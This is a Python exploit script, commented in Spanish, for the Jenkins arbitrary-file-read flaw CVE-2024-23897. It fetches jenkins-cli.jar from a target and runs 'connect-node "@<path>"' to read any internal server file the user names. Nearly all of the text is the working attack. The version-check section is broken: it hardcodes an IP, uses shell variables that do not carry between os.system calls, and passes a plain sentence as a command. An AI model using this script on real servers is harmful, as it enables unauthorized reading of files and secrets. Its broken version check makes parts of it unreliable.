import argparse
import requests
import subprocess
import os

def descargarCli(ip,puerto):
  #este codigo es para descargar el archivo jenkins-cli.jar
  #guardamos el url de la ruta que queremos descargar
  url=f'http://{ip}:{puerto}/jnlpJars/jenkins-cli.jar'
  jenkinscli='jenkins-cli.jar'
  try:
      #intentamos descargar el archivo
      respuesta=requests.get(url)
      if respuesta.status_code==200:
          #si el codigo de respuesta es 200 significa que el archivo se ha descargado correctamente
          with open(jenkinscli,'wb') as jenkinsclibinario: #wb significa que estamos abriendo el archivo en modo binario
              #abrimos el archivo y lo escribimos
              jenkinsclibinario.write(respuesta.content)
              print(f"Archivo descargado correctamente")
      else:
          #si el codigo de respuesta es distinto de 200 significa que el archivo no se ha descargado correctamente
          print("Error al descargar el archivo, el codigo de estado es: ",respuesta.status_code)
          return False
  except requests.RequestException as error:
      #si ocurre algun error en la descarga del archivo
      print("Hubo un fallo al hacer la solicitud: ",error)
      return False
  return True


def payload(ip,puerto,ruta):
    #este codigo es para crear el payload
    archivo_jar='jenkins-cli.jar'
    payload=f'java -jar {archivo_jar} -s http://{ip}:{puerto}/ -http connect-node "@{ruta}"'
    try:
        #intentamos ejecutar el payload
        #subprocess sirve para ejecutar comandos en el sistema operativo
        #tambien se podria usar el modulo os
        subprocess.run(payload,shell=True,check=True)
        #vamos a remocer el archivo jenkins-cli.jar
        os.remove(archivo_jar)
        return True
    except subprocess.CalledProcessError as error_subprocess:
        #si ocurre algun error en la ejecucion del payload
        print("Hubo un fallo en la ejecucion del payload: ",error_subprocess)
        return False
    
def main():
  # este parser se usa para parsear los argumentos que se pasan al script
  parser = argparse.ArgumentParser(description='Script para explotar el CVE-2024-23897')

  #estos parser son para leer los argumentos que se pasen al scipt o para entenderse son los parametros pero todavia falta variable
  parser.add_argument("ip", type = str, help ="direccion IP del sistema")
  parser.add_argument("puerto", type = int, help ="puerto del servicio")
  parser.add_argument("ruta", type = str, help ="archivo interno del servidor que queramos leer")
  argumentos=parser.parse_args()

  #este codigo es para leer los parametros que se pasan al script
  ip=argumentos.ip #de los argumentos quiero la ip  
  puerto=argumentos.puerto #de los argumentos quiero el puerto
  ruta=argumentos.ruta #de los argumentos quiero el archivo que queremos leer

  #los dos os.system son para ejecutar comandos en el sistema operativo
  os.system("variable=$(curl http://172.17.0.2:8080/api/ | html2text | grep 'Jenkins')")
  os.system("echo $variable | tail -n 1")

  os.system("La version de kenkins es: $version")
  
  if descargarCli(ip,puerto):
      #si el codigo de respuesta es 200 significa que el archivo se ha descargado correctamente
      payload(ip,puerto,ruta)
main()